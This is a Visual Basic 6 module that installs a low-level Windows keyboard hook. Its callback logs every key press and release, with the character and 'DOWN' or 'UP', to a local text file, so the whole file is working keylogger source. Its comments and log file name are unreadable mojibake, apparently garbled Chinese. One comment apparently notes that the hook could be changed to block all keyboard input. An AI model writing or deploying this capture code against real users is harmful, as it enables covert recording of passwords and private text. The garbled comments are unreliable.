Attribute VB_Name = "Module1"
Public hHook As Long    '������Ź��ӵľ��

Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long

Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Long) As Long

Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)


     Public Type EVENTMSG
        vKey As Long
       sKey As Long
       flag As Long
       time As Long
      End Type

Public mymsg  As EVENTMSG

Public Const WH_KEYBOARD_LL = 13

Public Const WM_KEYDOWN = &H100
Public Const WM_KEYUP = &H101

Public Function MyKBHook(ByVal ncode As Long, ByVal wParam As Long, ByVal lParam As Long) As Long

'��Щ�����ڲ�ͬ�����о��в�ͬ���壬������ncode �����ʹ���
If ncode = 0 Then
 If wParam = WM_KEYDOWN Or wParam = WM_KEYUP Then  '������wParam ��ʾ�����¼�������İ�����Ϣ������lParam ָ����ָ����ڴ�������

'���ڴ���lParam ָ����ָ������ݸ��Ƶ�mymsg����Զ�������
CopyMemory mymsg, ByVal lParam, Len(mymsg)

Open "���̼�¼.txt" For Append As #1

If wParam = WM_KEYDOWN Then
    Write #1, Chr(mymsg.vKey), "DOWN"
Else
    Write #1, Chr(mymsg.vKey), "UP"
End If

Close #1
End If
End If

'����Ϣ������һ�����ӣ���������������̣�ֻ��Ҫ�����ĳ�MyKBHook =-1����ʾ�Ե������Ϣ���������̾����벻����:-)

MyKBHook = CallNextHookEx(hHook, ncode, wParam, lParam)

End Function
